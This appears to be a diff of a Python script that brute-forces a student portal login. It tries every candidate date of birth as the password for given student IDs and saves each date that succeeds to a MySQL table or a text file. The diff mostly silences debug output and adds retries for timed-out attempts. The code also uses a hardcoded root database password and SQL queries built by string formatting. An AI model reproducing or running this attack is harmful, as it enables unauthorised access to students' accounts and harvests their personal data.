@@ -29,27 +29,31 @@ def get_years(u_id, reg_no_):
     return years  
 
 def check_date(The_day_):
+
+    global time_out_dates, payload
+
     payload['txtpassword'] = The_day_
                 
     try:
         page = requests.post(student_login_url, data = payload, timeout = 10)
-        print(The_day_)
+        #print(The_day_)
     except:
-        print('timed out', The_day_)
+        #print('timed out', The_day_)
         time_out_dates.append(The_day_)               
         
 
     #print(page.url)
     if page.url != student_login_url: 
-        print('dob found 1')        
-        print(The_day_)  
-        print('dob found 2')             
+        #print('dob found 1')        
+        #print(The_day_)  
+        #print('dob found 2')             
         return True
     
     return False 
 
 
 def find_student_dob(user_id, year_of_birth = None):
+    global time_out_dates
 
     mycon = mysql.connector.connect(host="localhost", passwd="rootmysql",user="root", database = 'kcg', autocommit = True)
     mysql_cursor = mycon.cursor()
@@ -94,23 +98,31 @@ def find_student_dob(user_id, year_of_birth = None):
                     The_day = str_day + str_month + str_yob
                     
                     if check_date(The_day):
-                        print('dob found 3')
-                        mysql_cursor.execute("INSERT INTO dobs VALUES('{}','{}')".format(user_id,The_day))
-                        mysql_cursor.execute('commit')
-                        print('dob found 4')
+                        #print('dob found 3')
+                        try:
+                            mysql_cursor.execute("INSERT INTO dobs VALUES('{}','{}')".format(user_id,The_day))
+                            #print('dob found 4')
+                        except:
+                            with open('dates.txt', 'a') as file:
+                                file.write('{}  {}'.format(user_id, The_day))
 
                         mysql_cursor.close()
                         mycon.close()
+                        time_out_dates = []
 
                         return The_day
 
-        for date_ in time_out_dates:
+        for date_ in time_out_dates: #check timeout dates
             if check_date(date_):
-                mysql_cursor.execute("INSERT INTO dobs VALUES('{}','{}')".format(user_id,date_))
-                mysql_cursor.execute('commit')
+                try:
+                    mysql_cursor.execute("INSERT INTO dobs VALUES('{}','{}')".format(user_id,The_day))
+                except:
+                    with open('dates.txt', 'a') as file:
+                        file.write('{}  {}'.format(user_id, The_day))
 
                 mysql_cursor.close()
                 mycon.close()
+                time_out_dates = []
 
                 return date_
 
@@ -118,7 +130,10 @@ def find_student_dob(user_id, year_of_birth = None):
         
     raise Exception   
 
-find_student_dob('311020104023', '2003')                        
+
+#find_student_dob('20cs023')  
+
+#find_student_dob('311020104023', '2003')                        
             
 
 
